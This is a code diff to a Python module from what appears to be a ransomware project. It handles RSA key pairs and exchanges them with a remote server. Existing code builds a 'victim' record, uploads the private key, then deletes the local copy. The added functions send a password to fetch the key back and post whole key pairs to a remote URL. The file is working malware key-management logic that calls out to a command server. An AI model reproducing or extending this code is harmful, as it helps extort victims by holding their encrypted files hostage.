@@ -43,8 +43,16 @@ def getToken():
     with open(tokenFilePath) as jsonFile:
         token = (json.load(jsonFile))['token']
         jsonFile.close()
-
     return token
+
+def getPassword():
+    password = ""
+    filepath = os.path.join(os.path.join(os.getcwd(), "keys"),"info")
+    with open(filepath, 'r') as file:
+        password = (json.load(file))['password']
+        file.close()
+    return password    
+
 
 def uploadPrivateKey(filepath):
     victim = {}
@@ -59,18 +67,38 @@ def uploadPrivateKey(filepath):
     requests.post(url = constants.CONST_UPLOAD_URL, data = victim, headers = headers) 
     os.remove(filepath)
 
-def downloadPrivateKey():
+def downloadPrivateKey(password):
     rsakeys.createDirectory('keys')
     keyFolder = os.path.join(os.getcwd(), "keys")
     privateKeyPath = os.path.join(keyFolder, "private_key")
     token = getToken()
     headers = {}
     headers['Authorization'] = 'Bearer ' + token
-    r = requests.get(url = constants.CONST_DOWNLOAD_URL, headers = headers) 
+    params = {}
+    params['password'] = password
+    r = requests.get(url = constants.CONST_DOWNLOAD_URL, headers = headers, data=params )
+
+    # TODO: Add in param['public'] for database to search for corresponding private key 
     data = r.json()
+    print(data)
     with open(privateKeyPath, 'w') as privateKey:
        privateKey.write((data[0])['key'])
        privateKey.close()
+
+def postKeyPair(directory):
+    keyPair = {}
+    privateKeyPath = os.path.join(directory, constants.CONST_PRIVATE_KEY)
+    publicKeyPath = os.path.join(directory, constants.CONST_PUBLIC_KEY)
+    with open(privateKeyPath) as file:
+        keyPair['private'] = file.read()
+        file.close()
+
+    with open(publicKeyPath) as file:
+        keyPair['public'] = file.read()
+        file.close()
+
+    requests.post(url = constants.CONST_ADD_URL, data = keyPair)
+    # TODO get token from server
 
 def startProcess():
     rsakeys.createDirectory('keys')
@@ -80,4 +108,3 @@ def startProcess():
     createCredentials()
     createToken()
     uploadPrivateKey(privateKeyPath)
-    
